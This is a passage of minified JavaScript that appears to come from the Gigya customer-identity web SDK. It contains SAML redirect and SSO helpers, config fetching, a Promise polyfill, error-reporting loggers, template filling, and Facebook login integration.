    function r(e, t, n) {
      e = o(e = c(e, t), n), location.href = e;
    }
    function a(e) {
      return window.gigya._.apiAdapters.web.tokenStore.get(e);
    }
    function s(e) {
      return "gig_samlContext_" + e;
    }
    t.urlParams = function (e) {
      e.indexOf("?") > -1 && (e = e.substring(e.indexOf("?") + 1));
      for (var t = e.split(/&/), n = {}, i = 0; i < t.length; ++i) {
        var o = t[i];
        if (-1 !== o.indexOf("=")) {
          var r = o.split("=");
          2 === r.length && (n[r[0]] = decodeURIComponent(r[1]));
        }
      }
      return n;
    }, t.openIframe = function (e, t, n) {
      var i = !1,
        o = function () {
          i || (i = !0, t());
        };
      window.gigya.utils.script.triggerResource(e, o, window.gigya.utils.script.ResourceTypes.iframe, !1), n && setTimeout(o, n);
    }, t.reportError = function (e, t) {
      if (window.gigya.samlConfig.errorPageURL) return r(window.gigya.samlConfig.errorPageURL, t, {
        error: e
      });
    }, t.redirectToSamlEndPont = function (e, t, n) {
      return i.__awaiter(this, void 0, void 0, function () {
        var o, a, s;
        return i.__generator(this, function (i) {
          switch (i.label) {
            case 0:
              return o = window.gigya._.getApiDomain("fidm"), a = "https://" + o + "/saml/v2.0/" + n + "/" + e, [4, window.gigya._.apiAdapter.getGmidTicket()];
            case 1:
              return (s = i.sent()) && (t.gmidTicket = s), r(a, {
                domain: o,
                apiKey: n,
                endPoint: e
              }, t), [2];
          }
        });
      });
    }, t.setUrlParams = o, t.redirect = r, t.getLoginToken = a, t.getLoginTokenExpiration = function (e) {
      return window.gigya._.apiAdapters.web.tokenStore.getGltexpCookie(e);
    };
    function c(e, t) {
      return window.gigya.utils.templates.fill(e, t);
    }
    t.saveContext = function (e, t, n) {
      var i = s(e),
        o = window.gigya.utils.sessionCache.get(i, 6e5) || [];
      o.push(t), window.gigya.utils.sessionCache.set(i, o), n();
    }, t.loadContext = function (e, t) {
      var n = s(e),
        i = window.gigya.utils.sessionCache.get(n, 6e5) || [],
        o = i.pop() || {};
      window.gigya.utils.sessionCache.set(n, i), t(o);
    }, t.templateFill = c, t.deserializeJSON = function (e) {
      return window.gigya.utils.JSON.deserialize(e, "");
    }, t.objectMerge = function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      return window.gigya.utils.object.merge(e);
    }, t.isLoggedIn = function (e, t) {
      !function (e) {
        var t = a(e);
        return Boolean(t);
      }(t) ? e(!1) : window.gigya.accounts.getAccountInfo({
        callback: function (t) {
          e(0 === (null == t ? void 0 : t.errorCode));
        }
      });
    }, t.logout = function (e, t) {
      window.gigya.socialize.logout({
        callback: t,
        samlContext: e
      });
    };
  }, function (e, t, n) {
    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = n(9),
        o = /\/\/cdn(s)?\.(ru1\.)?gigya.com/,
        r = ["gigya.js", "socialize.js", "socialize2.js", "gsjssdk.js"];
      function a(t) {
        void 0 === t && (t = {}), window.gigya.logger.info("globalConf is updated", {
          updateObject: t
        }), e(window.gigya.thisScript.globalConf || {}, t);
      }
      t.getGigyaScriptElement = function () {
        for (var e, t = document.getElementsByTagName("script"), n = function (n) {
            var i = t[n],
              a = i.src.toLowerCase();
            if ("" !== a && (o.test(a) || a.indexOf("?apikey=") > -1) && (0 === r.length || r.some(function (e) {
              return a.indexOf(e) > -1;
            }))) return e = i, "break";
          }, i = t.length - 1; i >= 0; i--) {
          if ("break" === n(i)) break;
        }
        return e;
      }, t.updateConfiguration = a, i.createAlias("gigya.updateConfiguration", a);
    }).call(this, n(0).__assign);
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(22),
      r = n(6);
    t.getSdkConfig = function (e, t) {
      return void 0 === e && (e = (null === window.gigya || void 0 === window.gigya ? void 0 : window.gigya.configHostnameOverride) || o.getStorageDomain()), void 0 === t && (t = 0), i.__awaiter(this, void 0, void 0, function () {
        var n;
        return i.__generator(this, function (i) {
          switch (i.label) {
            case 0:
              return n = window.gigya.apiKey, [4, r.Uri.parse(e + "/sdk.config.get").addToSearch({
                apiKey: n,
                httpStatusCodes: !0
              }).fetch(t)];
            case 1:
              return [2, i.sent()];
          }
        });
      });
    }, t.getSsoContext = function (e, t, n) {
      return void 0 === t && (t = o.resolveApiDomain()), void 0 === n && (n = 0), i.__awaiter(this, void 0, void 0, function () {
        var o;
        return i.__generator(this, function (i) {
          switch (i.label) {
            case 0:
              o = window.gigya.apiKey, i.label = 1;
            case 1:
              return i.trys.push([1, 3,, 4]), [4, r.Uri.parse(t + "/accounts.sso.getContext").addToSearch({
                APIKey: o,
                ssoToken: e,
                format: "json"
              }).fetch(n)];
            case 2:
              return [2, i.sent()];
            case 3:
              return i.sent(), [2, {}];
            case 4:
              return [2];
          }
        });
      });
    }, t.getConsentStatus = function (e) {
      return i.__awaiter(this, void 0, void 0, function () {
        var t, n, o, a;
        return i.__generator(this, function (i) {
          switch (i.label) {
            case 0:
              return t = (null == e ? void 0 : e.domain) || window.gigya._.getApiDomain("accounts"), n = (null == e ? void 0 : e.retries) || 0, o = window.gigya.apiKey, a = t + "/sdk.getConsentStatus", [4, r.Uri.parse(a).addToSearch({
                apiKey: o
              }).fetch(n)];
            case 1:
              return [2, i.sent()];
          }
        });
      });
    };
  },,, function (e, t, n) {
    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = n(78),
        o = n(81);
      window.gigya.logger || e(window.gigya, {
        logger: window === window.top ? new i.ParentLogger() : new o.IFrameLogger()
      });
    }).call(this, n(0).__assign);
  },,,,,,, function (e, t, n) {
    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = n(74);
      e(window.gigya, {
        Promise: i
      });
    }).call(this, n(0).__assign);
  }, function (e, t, n) {
    (function (t, n) {
      var i;
      i = function () {
        "use strict";

        function e(e) {
          return "function" == typeof e;
        }
        var i = Array.isArray ? Array.isArray : function (e) {
            return "[object Array]" === Object.prototype.toString.call(e);
          },
          o = 0,
          r = void 0,
          a = void 0,
          s = function (e, t) {
            p[o] = e, p[o + 1] = t, 2 === (o += 2) && (a ? a(h) : _());
          },
          c = "undefined" != typeof window ? window : void 0,
          u = c || {},
          l = u.MutationObserver || u.WebKitMutationObserver,
          d = "undefined" == typeof self && void 0 !== t && "[object process]" === {}.toString.call(t),
          g = "undefined" != typeof Uint8ClampedArray && "undefined" != typeof importScripts && "undefined" != typeof MessageChannel;
        function f() {
          var e = setTimeout;
          return function () {
            return e(h, 1);
          };
        }
        var p = new Array(1e3);
        function h() {
          for (var e = 0; e < o; e += 2) (0, p[e])(p[e + 1]), p[e] = void 0, p[e + 1] = void 0;
          o = 0;
        }
        var v,
          y,
          w,
          m,
          _ = void 0;
        function b(e, t) {
          var n = this,
            i = new this.constructor(A);
          void 0 === i[P] && j(i);
          var o = n._state;
          if (o) {
            var r = arguments[o - 1];
            s(function () {
              return L(o, i, r, n._result);
            });
          } else E(n, i, e, t);
          return i;
        }
        function S(e) {
          if (e && "object" == typeof e && e.constructor === this) return e;
          var t = new this(A);
          return k(t, e), t;
        }
        d ? _ = function () {
          return t.nextTick(h);
        } : l ? (y = 0, w = new l(h), m = document.createTextNode(""), w.observe(m, {
          characterData: !0
        }), _ = function () {
          m.data = y = ++y % 2;
        }) : g ? ((v = new MessageChannel()).port1.onmessage = h, _ = function () {
          return v.port2.postMessage(0);
        }) : _ = void 0 === c ? function () {
          try {
            var e = Function("return this")().require("vertx");
            return void 0 !== (r = e.runOnLoop || e.runOnContext) ? function () {
              r(h);
            } : f();
          } catch (e) {
            return f();
          }
        }() : f();
        var P = Math.random().toString(36).substring(2);
        function A() {}
        function I(t, n, i) {
          n.constructor === t.constructor && i === b && n.constructor.resolve === S ? function (e, t) {
            1 === t._state ? x(e, t._result) : 2 === t._state ? O(e, t._result) : E(t, void 0, function (t) {
              return k(e, t);
            }, function (t) {
              return O(e, t);
            });
          }(t, n) : void 0 === i ? x(t, n) : e(i) ? function (e, t, n) {
            s(function (e) {
              var i = !1,
                o = function (e, t, n, i) {
                  try {
                    e.call(t, n, i);
                  } catch (e) {
                    return e;
                  }
                }(n, t, function (n) {
                  i || (i = !0, t !== n ? k(e, n) : x(e, n));
                }, function (t) {
                  i || (i = !0, O(e, t));
                }, e._label);
              !i && o && (i = !0, O(e, o));
            }, e);
          }(t, n, i) : x(t, n);
        }
        function k(e, t) {
          if (e === t) O(e, new TypeError("You cannot resolve a promise with itself"));else if (o = typeof (i = t), null === i || "object" !== o && "function" !== o) x(e, t);else {
            var n = void 0;
            try {
              n = t.then;
            } catch (t) {
              return void O(e, t);
            }
            I(e, t, n);
          }
          var i, o;
        }
        function C(e) {
          e._onerror && e._onerror(e._result), T(e);
        }
        function x(e, t) {
          void 0 === e._state && (e._result = t, e._state = 1, 0 !== e._subscribers.length && s(T, e));
        }
        function O(e, t) {
          void 0 === e._state && (e._state = 2, e._result = t, s(C, e));
        }
        function E(e, t, n, i) {
          var o = e._subscribers,
            r = o.length;
          e._onerror = null, o[r] = t, o[r + 1] = n, o[r + 2] = i, 0 === r && e._state && s(T, e);
        }
        function T(e) {
          var t = e._subscribers,
            n = e._state;
          if (0 !== t.length) {
            for (var i = void 0, o = void 0, r = e._result, a = 0; a < t.length; a += 3) i = t[a], o = t[a + n], i ? L(n, i, o, r) : o(r);
            e._subscribers.length = 0;
          }
        }
        function L(t, n, i, o) {
          var r = e(i),
            a = void 0,
            s = void 0,
            c = !0;
          if (r) {
            try {
              a = i(o);
            } catch (e) {
              c = !1, s = e;
            }
            if (n === a) return void O(n, new TypeError("A promises callback cannot return that same promise."));
          } else a = o;
          void 0 !== n._state || (r && c ? k(n, a) : !1 === c ? O(n, s) : 1 === t ? x(n, a) : 2 === t && O(n, a));
        }
        var D = 0;
        function j(e) {
          e[P] = D++, e._state = void 0, e._result = void 0, e._subscribers = [];
        }
        var M = function () {
            function e(e, t) {
              this._instanceConstructor = e, this.promise = new e(A), this.promise[P] || j(this.promise), i(t) ? (this.length = t.length, this._remaining = t.length, this._result = new Array(this.length), 0 === this.length ? x(this.promise, this._result) : (this.length = this.length || 0, this._enumerate(t), 0 === this._remaining && x(this.promise, this._result))) : O(this.promise, new Error("Array Methods must be provided an Array"));
            }
            return e.prototype._enumerate = function (e) {
              for (var t = 0; void 0 === this._state && t < e.length; t++) this._eachEntry(e[t], t);
            }, e.prototype._eachEntry = function (e, t) {
              var n = this._instanceConstructor,
                i = n.resolve;
              if (i === S) {
                var o = void 0,
                  r = void 0,
                  a = !1;
                try {
                  o = e.then;
                } catch (e) {
                  a = !0, r = e;
                }
                if (o === b && void 0 !== e._state) this._settledAt(e._state, t, e._result);else if ("function" != typeof o) this._remaining--, this._result[t] = e;else if (n === R) {
                  var s = new n(A);
                  a ? O(s, r) : I(s, e, o), this._willSettleAt(s, t);
                } else this._willSettleAt(new n(function (t) {
                  return t(e);
                }), t);
              } else this._willSettleAt(i(e), t);
            }, e.prototype._settledAt = function (e, t, n) {
              var i = this.promise;
              void 0 === i._state && (this._remaining--, 2 === e ? O(i, n) : this._result[t] = n), 0 === this._remaining && x(i, this._result);
            }, e.prototype._willSettleAt = function (e, t) {
              var n = this;
              E(e, void 0, function (e) {
                return n._settledAt(1, t, e);
              }, function (e) {
                return n._settledAt(2, t, e);
              });
            }, e;
          }(),
          R = function () {
            function t(e) {
              this[P] = D++, this._result = this._state = void 0, this._subscribers = [], A !== e && ("function" != typeof e && function () {
                throw new TypeError("You must pass a resolver function as the first argument to the promise constructor");
              }(), this instanceof t ? function (e, t) {
                try {
                  t(function (t) {
                    k(e, t);
                  }, function (t) {
                    O(e, t);
                  });
                } catch (t) {
                  O(e, t);
                }
              }(this, e) : function () {
                throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.");
              }());
            }
            return t.prototype.catch = function (e) {
              return this.then(null, e);
            }, t.prototype.finally = function (t) {
              var n = this.constructor;
              return e(t) ? this.then(function (e) {
                return n.resolve(t()).then(function () {
                  return e;
                });
              }, function (e) {
                return n.resolve(t()).then(function () {
                  throw e;
                });
              }) : this.then(t, t);
            }, t;
          }();
        return R.prototype.then = b, R.all = function (e) {
          return new M(this, e).promise;
        }, R.race = function (e) {
          var t = this;
          return i(e) ? new t(function (n, i) {
            for (var o = e.length, r = 0; r < o; r++) t.resolve(e[r]).then(n, i);
          }) : new t(function (e, t) {
            return t(new TypeError("You must pass an array to race."));
          });
        }, R.resolve = S, R.reject = function (e) {
          var t = new this(A);
          return O(t, e), t;
        }, R._setScheduler = function (e) {
          a = e;
        }, R._setAsap = function (e) {
          s = e;
        }, R._asap = s, R.polyfill = function () {
          var e = void 0;
          if (void 0 !== n) e = n;else if ("undefined" != typeof self) e = self;else try {
            e = Function("return this")();
          } catch (e) {
            throw new Error("polyfill failed because global object is unavailable in this environment");
          }
          var t = e.Promise;
          if (t) {
            var i = null;
            try {
              i = Object.prototype.toString.call(t.resolve());
            } catch (e) {}
            if ("[object Promise]" === i && !t.cast) return;
          }
          e.Promise = R;
        }, R.Promise = R, R;
      }, e.exports = i();
    }).call(this, n(75), n(23));
  }, function (e, t) {
    var n,
      i,
      o = e.exports = {};
    function r() {
      throw new Error("setTimeout has not been defined");
    }
    function a() {
      throw new Error("clearTimeout has not been defined");
    }
    function s(e) {
      if (n === setTimeout) return setTimeout(e, 0);
      if ((n === r || !n) && setTimeout) return n = setTimeout, setTimeout(e, 0);
      try {
        return n(e, 0);
      } catch (t) {
        try {
          return n.call(null, e, 0);
        } catch (t) {
          return n.call(this, e, 0);
        }
      }
    }
    !function () {
      try {
        n = "function" == typeof setTimeout ? setTimeout : r;
      } catch (e) {
        n = r;
      }
      try {
        i = "function" == typeof clearTimeout ? clearTimeout : a;
      } catch (e) {
        i = a;
      }
    }();
    var c,
      u = [],
      l = !1,
      d = -1;
    function g() {
      l && c && (l = !1, c.length ? u = c.concat(u) : d = -1, u.length && f());
    }
    function f() {
      if (!l) {
        var e = s(g);
        l = !0;
        for (var t = u.length; t;) {
          for (c = u, u = []; ++d < t;) c && c[d].run();
          d = -1, t = u.length;
        }
        c = null, l = !1, function (e) {
          if (i === clearTimeout) return clearTimeout(e);
          if ((i === a || !i) && clearTimeout) return i = clearTimeout, clearTimeout(e);
          try {
            i(e);
          } catch (t) {
            try {
              return i.call(null, e);
            } catch (t) {
              return i.call(this, e);
            }
          }
        }(e);
      }
    }
    function p(e, t) {
      this.fun = e, this.array = t;
    }
    function h() {}
    o.nextTick = function (e) {
      var t = new Array(arguments.length - 1);
      if (arguments.length > 1) for (var n = 1; n < arguments.length; n++) t[n - 1] = arguments[n];
      u.push(new p(e, t)), 1 !== u.length || l || s(f);
    }, p.prototype.run = function () {
      this.fun.apply(null, this.array);
    }, o.title = "browser", o.browser = !0, o.env = {}, o.argv = [], o.version = "", o.versions = {}, o.on = h, o.addListener = h, o.once = h, o.off = h, o.removeListener = h, o.removeAllListeners = h, o.emit = h, o.prependListener = h, o.prependOnceListener = h, o.listeners = function (e) {
      return [];
    }, o.binding = function (e) {
      throw new Error("process.binding is not supported");
    }, o.cwd = function () {
      return "/";
    }, o.chdir = function (e) {
      throw new Error("process.chdir is not supported");
    }, o.umask = function () {
      return 0;
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), function (e) {
      e[e._undefined = 0] = "_undefined", e[e.desktop = 1] = "desktop", e[e.mobile = 2] = "mobile", e[e.auto = 3] = "auto";
    }(t.DeviceTypes || (t.DeviceTypes = {}));
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = function () {
        function e(e, t, n) {
          void 0 === e && (e = window.gigya.XhrRequest), void 0 === t && (t = 15e3), void 0 === n && (n = window), this._xhrRequest = e, this.timeout = t, this._win = n;
        }
        return e.prototype.send = function (e, t, n, o, r) {
          return void 0 === r && (r = {}), i.__awaiter(this, void 0, void 0, function () {
            var a = this;
            return i.__generator(this, function (s) {
              return [2, new gigya.Promise(function (s, c) {
                return i.__awaiter(a, void 0, void 0, function () {
                  var a, u, l, d;
                  return i.__generator(this, function (i) {
                    switch (i.label) {
                      case 0:
                        a = new this._xhrRequest(e, t, n, o, r), u = this._win.setTimeout(function () {
                          c("API request timeout");
                        }, this.timeout), i.label = 1;
                      case 1:
                        return i.trys.push([1, 3, 4, 5]), l = s, [4, a.send()];
                      case 2:
                        return l.apply(void 0, [i.sent()]), [3, 5];
                      case 3:
                        return d = i.sent(), window.gigya.logger.report("XHR request failed", {
                          methodName: t,
                          params: n,
                          settings: o,
                          err: d
                        }), c("Request for " + t + " failed"), [3, 5];
                      case 4:
                        return this._win.clearTimeout(u), [7];
                      case 5:
                        return [2];
                    }
                  });
                });
              })];
            });
          });
        }, e;
      }();
    t.RequestProvider = o;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(57),
      r = n(80),
      a = n(62),
      s = n(10),
      c = n(3),
      u = n(6),
      l = function (e) {
        function t(t, n, i, o, a) {
          void 0 === t && (t = window), void 0 === n && (n = window.gigya.errorReport), void 0 === i && (i = window.gigya.canary), void 0 === o && (o = function () {
            return 100 * Math.random();
          }), void 0 === a && (a = r.loggerJsonp);
          var s = e.call(this, t) || this;
          s._global = t, s._errorReportConfig = n, s._canaryConfig = i, s._random = o, s._jsonp = a;
          var c = s._errorReportConfig && s._errorReportConfig.enabled,
            u = s._canaryConfig && s._canaryConfig.isActive,
            l = s.enrollErrorReporting();
          return c && (u || l) && (s._isErrorReporter = !0, s.setupMessageListener(), s._guid = s.generateGUID()), s;
        }
        return i.__extends(t, e), t.prototype.enrollErrorReporting = function () {
          return (this._errorReportConfig && this._errorReportConfig.probability) >= this._random();
        }, t.prototype.setupMessageListener = function () {
          var e = this;
          this._global.addEventListener("message", function (t) {
            var n = window.gigya.dataCenter,
              i = window.gigya.defaultApiDomain.replace(/\./g, "."),
              r = new RegExp("cdns?." + n + "." + i + "$");
            if (t.origin.match(r)) try {
              var a = JSON.parse(t.data);
              a.type === o.gigErrorReport && e.report(a.message, a.details, a.includeStack);
            } catch (e) {}
          }, !1);
        }, t.prototype.getApiKey = function () {
          var e = window.gigya.thisScript && window.gigya.thisScript.APIKey;
          if (!e) {
            var t = a.getGigyaScriptElement();
            e = (s.getParamsFromURL(t && t.src, !0) || {}).apikey;
          }
          return e;
        }, t.prototype.createReportParams = function (e, t, n) {
          void 0 === t && (t = {}), void 0 === n && (n = !1);
          var i = {
            message: e,
            apiKey: this.getApiKey(),
            stack: n ? new Error().stack : "",
            page: c.localInfo && c.localInfo.pageDomain,
            browser: c.localInfo && c.localInfo.currentBrowser,
            buildVersion: window.gigya.build.version,
            buildNumber: window.gigya.build.number,
            format: "json",
            sdk: "web"
          };
          return "string" == typeof t && (t = {
            message: t
          }), t.guid = this._guid, i.details = JSON.stringify(t), i;
        }, t.prototype.report = function (e, t, n, i) {
          if (void 0 === n && (n = !1), void 0 === i && (i = !1), i || this._isErrorReporter) try {
            var o = this.createReportParams(e, t, n),
              r = location.protocol + "//" + this.apiDomain + "/sdk.errorReport";
            u.Uri.parse(r).addToSearch(o).fetch(0);
          } catch (e) {}
        }, t.prototype.generateGUID = function () {
          try {
            return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (e) {
              var t = 16 * Math.random() | 0;
              return ("x" == e ? t : 3 & t | 8).toString(16);
            });
          } catch (e) {
            return "";
          }
        }, Object.defineProperty(t.prototype, "apiDomain", {
          get: function () {
            var e, t;
            return (null === (e = window.gigya.partnerSettings) || void 0 === e ? void 0 : e.customAPIDomainPrefix) && (null === c.localInfo || void 0 === c.localInfo ? void 0 : c.localInfo.baseDomain.endsWith(window.gigya._.config.hostedPagesDomain)) ? c.localInfo.baseDomain : (null === (t = window.gigya.partnerSettings) || void 0 === t ? void 0 : t.customAPIDomainPrefix) && c.localInfo.baseDomain && c.localInfo.baseDomain !== window.gigya.defaultApiDomain ? window.gigya.partnerSettings.customAPIDomainPrefix + "." + c.localInfo.baseDomain : "accounts." + window.gigya.dataCenter + "." + window.gigya.defaultApiDomain;
          },
          enumerable: !0,
          configurable: !0
        }), t;
      }(o.BaseLogger);
    t.ParentLogger = l;
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), function (e) {
      e[e.disabled = 0] = "disabled", e[e.debug = 1] = "debug", e[e.info = 2] = "info", e[e.warn = 3] = "warn", e[e.error = 4] = "error";
    }(t.LogLevel || (t.LogLevel = {}));
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.loggerJsonp = function (e, t) {
      var n = document.createElement("script");
      n.src = e + "?" + t, n.type = "text/javascript", n.onload = function () {
        document.getElementsByTagName("head")[0].removeChild(n);
      }, document.getElementsByTagName("head")[0].appendChild(n);
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(57),
      r = n(36),
      a = function (e) {
        function t(t) {
          void 0 === t && (t = window);
          var n = e.call(this, t) || this;
          return n._global = t, n;
        }
        return i.__extends(t, e), t.prototype.report = function (e, t, n) {
          void 0 === n && (n = !0);
          try {
            var i = document.createElement("a"),
              a = r.getReqParamValue(location.hash, "origin") || r.getReqParamValue(location.hash, "d");
            if (!a) return;
            i.href = a;
            var s = i.protocol + "//" + i.hostname + (i.port ? ":" + i.port : "");
            this._global.top.postMessage(JSON.stringify({
              type: o.gigErrorReport,
              message: e,
              details: t,
              includeStack: n
            }), s);
          } catch (e) {
            console.error(e);
          }
        }, t;
      }(o.BaseLogger);
    t.IFrameLogger = a;
  },,,,,,,,,,,, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.fill = function e(t, n) {
      "function" == typeof t && (t = t(n)), t instanceof Array && (t = t.join(""));
      var i = /(\$)(!?)([a-z_][a-z_.\d]*)([(][^()]*[)])?|(\$)(!?)\{([a-z_][a-z_.\d]*)([(][^()]*[)])?\}/gi;
      i.lastIndex = 0;
      for (var o, r = t, a = i.exec(r); null != a;) {
        var s = "!" == a[2 + (o = "$" == a[1] ? 0 : 4)],
          c = a[3 + o],
          u = a[4 + o];
        null == u && (u = "");
        "." == c.substring(0, 1) && (c = c.substring(1)), "DBG" == c.substring(0, 3) && (c = c.substring(3), 1);
        for (var l = "", d = c + u; d != l;) {
          l = d;
          var g = i.lastIndex;
          d = e(l, n), i.lastIndex = g;
        }
        var f = "",
          p = 0;
        if (null != n[c.split(".")[0]]) try {
          f = new Function("o", "p", 'return eval("o." + p)')(n, d);
        } catch (e) {} else f = "$" + (s ? "!" : "") + d, p = 1;
        r = s ? r.replace(a[0], "") : r.substr(0, a.index) + f + r.substr(a.index + a[0].length), i.lastIndex = a.index + p, a = i.exec(r);
      }
      return r;
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), function (e) {
      e[e.Social = 0] = "Social", e[e.Sso = 1] = "Sso";
    }(t.OAuthMode || (t.OAuthMode = {}));
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(9),
      o = n(4),
      r = n(17);
    window.gigya.socialize || (window.gigya.socialize = {}), window.gigya.gcs || (window.gigya.gcs = {}), window.gigya.gm || (window.gigya.gm = {}), window.gigya.comments || (window.gigya.comments = {}), window.gigya.accounts || (window.gigya.accounts = {}), window.gigya.gscounters || (window.gigya.gscounters = {});
    var a = {};
    t.getApi = function (e) {
      return a[e];
    };
    var s = function () {
      function e(e, t) {
        this.methodName = e, this.settings = t, this.addAlias(), a[e] = this;
      }
      return e.prototype.preprocessRequest = function (e, t) {
        this.settings.preprocessor ? this.settings.preprocessor(e, t) : t();
      }, e.prototype.addAlias = function () {
        var e = this;
        i.createAlias("gigya." + this.methodName, function () {
          for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
          var i = o.merge([t]),
            a = function () {
              i.lang && (i._explicitLang = !0);
              var t = o.merge([window.gigya.thisScript.globalConf, i]);
              e.run(t, i);
            };
          window.gigya.thisScript && window.gigya.thisScript.globalConf ? a() : r.queueForExecution("API", a);
        });
      }, e;
    }();
    t.BaseApi = s;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(4),
      o = n(32),
      r = n(13),
      a = n(35),
      s = n(3),
      c = [];
    function u() {
      if ("undefined" != typeof FB) {
        window.gigya.providersConfig.facebook && window.gigya.providersConfig.facebook.appID && FB && FB.getLoginStatus && FB.getLoginStatus(function (e) {
          t.initializedTime = new Date(), t.isConnected = "connected" == e.status, t.isLoggedIn = "unknown" != e.status, o.dispatch({
            eventName: "FBCRefreshed"
          });
        }, !0);
      }
    }
    function l() {
      var e = {};
      if ("undefined" != typeof FB && FB.getAuthResponse) try {
        var t = FB.getAuthResponse();
        t && (null != t.userID && (e.fb_UID = t.userID), null != t.accessToken && (e.fb_at = t.accessToken), null != t.expiresIn && (e.fb_exp = t.expiresIn));
      } catch (e) {}
      return e;
    }
    t.isLoggedIn = !1, t.isConnected = !1, t.isLoaded = function () {
      return null != t.initializedTime;
    }, t.load = function (e) {
      if (!t.initializedTime) {
        t.initializedTime = null, window.setInterval(function () {
          u();
        }, 27e5), window.fbAsyncInit = function () {
          var n = i.clone(window.gigya.thisScript.globalConf.facebookInitParams);
          n || (n = {}), window.gigya.providersConfig.facebook ? (n.appId = window.gigya.providersConfig.facebook.appID, n.version = window.gigya.providersConfig.facebook.version) : n.version = "v1.0", n.status = !1, n.cookie = !0, n.xfbml = !0, n.oauth = !0, FB.init(n), 1 != e ? FB.getLoginStatus(function (e) {
            t.initializedTime = new Date(), t.isConnected = "connected" == e.status, t.isLoggedIn = "unknown" != e.status, o.dispatch({
              eventName: "facebookLoaded",
              isLoggedIn: t.isLoggedIn,
              isConnected: t.isConnected
            }), window.gigya.socialize.addEventHandlers({
              listenerType: "component"
            }, {
              listenerDescription: "listener for updating Facebook Connect session",
              onLogin: function () {
                u();
              },
              onConnect: function () {
                u();
              },
              onLogout: function () {
                u();
              }
            });
          }, !0) : (t.initializedTime = new Date(), o.dispatch({
            eventName: "facebookLoaded",
            isLoggedIn: t.isLoggedIn,
            isConnected: t.isConnected
          }));
        };
        var n = document.createElement("div");
        n.id = "fb-root", r.appendToBody(n), a.load(s.localInfo.protocol + "://connect.facebook.net/" + window.gigya.thisScript.lang.full.replace("-", "_") + "/sdk.js", null, function () {
          "none" == document.documentElement.style.display && (document.documentElement.style.display = "");
        }, !0);
      }
    }, t.refreshSession = u, t.retryPending = function () {
      for (var e = c, t = 0; t < e.length; t++) e[t]();
      c = [];
    }, t.runWhenLoaded = function (e) {
      c.push(e);
    }, t.getParams = l, t.autoLogin = function () {
      window.gigya.socialize.waitForService({
        service: "facebook",
        callback: function () {
          window.gigya._.apiAdapter.isSessionValid(window.gigya.thisScript.globalConf, function (e) {
            var t = l();
            !e && t && t.fb_at && !window.gigya._.autoLoginInProgress && (window.gigya._.autoLoginInProgress = !0, window.gigya.socialize.notifyLogin({
              regSource: "autoLogin",
              providerSessions: {
                facebook: {
                  authToken: t.fb_at,
                  tokenExpiresIn: t.fb_exp
                }
              }
            }));
          });
        }
      });
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.defaultApiSchema = "ctag|APIKey|cid|oauth_token|source|sourceData|usePost|refUID|fb_UID|fb_at|fb_exp|environment|noAuth|httpStatusCodes", t.defaultOauthSchema = "ctag|temporary_account|authFlow|connectWithoutLogin|provider|redirectMethod|redirect_uri|pendingRegistration|lang|regSource|extraPermissions|sessionExpiration|forceAuthentication|includeiRank|includeAllIdentities|extraFields|enabledProviders|disabledProviders|signIDs|openIDUsername|openIDURL|openIDProviderLogo|openIDProviderName|finalizeRegistration|include|actionAttributes|profileAttributes|googlePlayAppID|bp_channel_url|loginIfExists|includeUserInfo|redirectURL|authCodeOnly|enablePopupLocation|invite|regToken|loginMode|apiDomain|conflictHandling|forcePermissions|signKeys|dataCenter|forceAuthentication", t.postBookmarkSchema = "provider|URL|url|title|description|target|cid|APIKey|shortURLs|source|sourceData|providerKey|thumbnailURL|tags|userAction|[providerCapability=actions]UserAction|actionAttributes|facebookDialogType", t.loginMethods = {
      "socialize.login": 1,
      "socialize.addConnection": 1,
      "socialize.notifyLogin": 1,
      "socialize.linkAccounts": 1,
      "accounts.login": 1,
      "accounts.otp.login": 1,
      "accounts.auth.magiclink.email.login": 1,
      "accounts.auth.otp.email.login": 1,
      "accounts.auth.login": 1,
      "accounts.socialLogin": 1,
      "accounts.linkAccounts": 1,
      "accounts.register": 1,
      "accounts.finalizeRegistration": 1,
      "accounts.notifySocialLogin": 1
    }, t.logoutMethods = {
      "socialize.logout": 1,
      "accounts.logout": 1,
      "socialize.deleteAccount": 1,
      "socialize.unlinkAccounts": 1
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(24),
      r = n(42),
      a = n(31),
      s = n(33);
    function c(e) {
      return void 0 === e && (e = window.gigya.thisScript.APIKey), i.__awaiter(this, void 0, void 0, function () {
        var t, n;
        return i.__generator(this, function (i) {
          switch (i.label) {
            case 0:
              return window.gigya.logger.info("sync login token from group"), [4, a.SsoService.getInstance()];
            case 1:
              return [4, null == (t = i.sent()) ? void 0 : t.getToken()];
            case 2:
              return n = i.sent(), [4, o.setFromSsoResponse(n, e)];
            case 3:
              return i.sent(), [2, o.get(e)];
          }
        });
      });
    }
    t.hasSession = function () {
      var e, t, n, a;
      return i.__awaiter(this, void 0, void 0, function () {
        var u, l, d, g, f, p;
        return i.__generator(this, function (i) {
          switch (i.label) {
            case 0:
